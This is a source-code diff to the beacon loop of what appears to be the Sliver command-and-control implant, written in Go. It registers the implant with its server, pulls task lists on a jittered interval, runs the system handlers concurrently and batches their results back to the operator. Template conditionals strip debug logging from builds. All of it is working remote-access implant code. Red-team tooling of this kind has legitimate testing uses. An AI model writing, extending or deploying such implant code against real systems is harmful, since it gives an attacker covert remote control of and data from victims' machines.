@@ -28,6 +28,7 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+	"sync"
 	"time"
 
 	// {{if .Config.Debug}}{{else}}
@@ -171,10 +172,6 @@ func main() {
 }
 
 func beaconMainLoop(beacon *transports.Beacon) {
-	sysHandlers := handlers.GetSystemHandlers()
-	// sysPivotHandlers := handlers.GetSystemPivotHandlers()
-	// specialHandlers := handlers.GetSpecialHandlers()
-
 	// Register beacon
 	err := beacon.Start()
 	if err != nil {
@@ -183,44 +180,114 @@ func beaconMainLoop(beacon *transports.Beacon) {
 		// {{end}}
 		return
 	}
+	// {{if .Config.Debug}}
+	log.Printf("Registering beacon with server")
+	// {{end}}
 	beacon.Send(Envelope(&sliverpb.BeaconRegister{
-		BeaconInterval: beacon.Interval,
-		Register:       RegisterSliver(),
+		Duration: &sliverpb.BeaconDuration{
+			Interval: beacon.Interval,
+			Jitter:   beacon.Jitter,
+		},
+		Register: RegisterSliver(),
 	}))
+	envelope, err := beacon.Recv()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] Error registering beacon: %s", err)
+		// {{end}}
+		return
+	}
 	beacon.Close()
 
-	// Main Loop
-	for {
-		beacon.Start()
-		envelope, err := beacon.Recv()
-		if err != nil {
-			break
-		}
-		tasks := &sliverpb.BeaconTasks{}
-		err = proto.Unmarshal(envelope.Data, tasks)
-		if err != nil {
-			break
-		}
+	tasks := &sliverpb.BeaconTasks{}
+	err = proto.Unmarshal(envelope.Data, tasks)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] Error parsing beacon tasks: %s", err)
+		// {{end}}
+		return
+	}
+	beaconID := tasks.ID
+	if beaconID == "" {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] Missing beacon id in task list")
+		// {{end}}
+		return
+	}
 
-		for _, task := range tasks.Tasks {
-			if handler, ok := sysHandlers[task.Type]; ok {
-				go handler(task.Data, func(data []byte, err error) {
-					err = beacon.Send(&sliverpb.Envelope{
-						ID:   task.ID,
-						Data: data,
-					})
-					if err != nil {
-						// {{if .Config.Debug}}
-						log.Printf("Task send %s", err)
-						// {{end}}
-						return
-					}
-				})
+	// BeaconMain - Is executed in it's own goroutine as the function will block
+	// until all tasks complete (in success or failure), if a task handler blocks
+	// forever it will simply block this set of tasks instead of the entire beacon
+	for {
+		go func() {
+			err := beaconMain(beaconID, beacon)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] %s", err)
+				// {{end}}
 			}
-		}
-		beacon.Close()
+		}()
 		time.Sleep(beacon.Duration())
 	}
+}
+
+func beaconMain(beaconID string, beacon *transports.Beacon) error {
+	err := beacon.Start()
+	if err != nil {
+		return err
+	}
+	envelope, err := beacon.Recv()
+	if err != nil {
+		return err
+	}
+	tasks := &sliverpb.BeaconTasks{}
+	err = proto.Unmarshal(envelope.Data, tasks)
+	if err != nil {
+		return err
+	}
+
+	results := []*sliverpb.Envelope{}
+	resultsMutex := &sync.Mutex{}
+	wg := &sync.WaitGroup{}
+	sysHandlers := handlers.GetSystemHandlers()
+	// specialHandlers := handlers.GetSpecialHandlers()
+
+	for _, task := range tasks.Tasks {
+		if handler, ok := sysHandlers[task.Type]; ok {
+			wg.Add(1)
+			go handler(task.Data, func(data []byte, err error) {
+				resultsMutex.Lock()
+				defer resultsMutex.Unlock()
+				defer wg.Done()
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] handler function returned an error: %s", err)
+				// {{end}}
+				results = append(results, &sliverpb.Envelope{
+					ID:   task.ID,
+					Data: data,
+				})
+			})
+		} else {
+			resultsMutex.Lock()
+			defer resultsMutex.Unlock()
+			results = append(results, &sliverpb.Envelope{
+				ID:                 task.ID,
+				UnknownMessageType: true,
+			})
+		}
+	}
+	wg.Wait() // Wait for all tasks to complete
+	err = beacon.Send(Envelope(&sliverpb.BeaconTasks{
+		ID:    beaconID,
+		Tasks: results,
+	}))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] Error sending results %s", err)
+		// {{end}}
+	}
+	beacon.Close()
+	return nil
 }
 
 func sessionMainLoop(connection *transports.Connection) {
@@ -268,6 +335,9 @@ func sessionMainLoop(connection *transports.Connection) {
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope.Data, func(data []byte, err error) {
+				// {{if .Config.Debug}}
+				log.Printf("handler function returned an error: %s", err)
+				// {{end}}
 				connection.Send <- &sliverpb.Envelope{
 					ID:   envelope.ID,
 					Data: data,
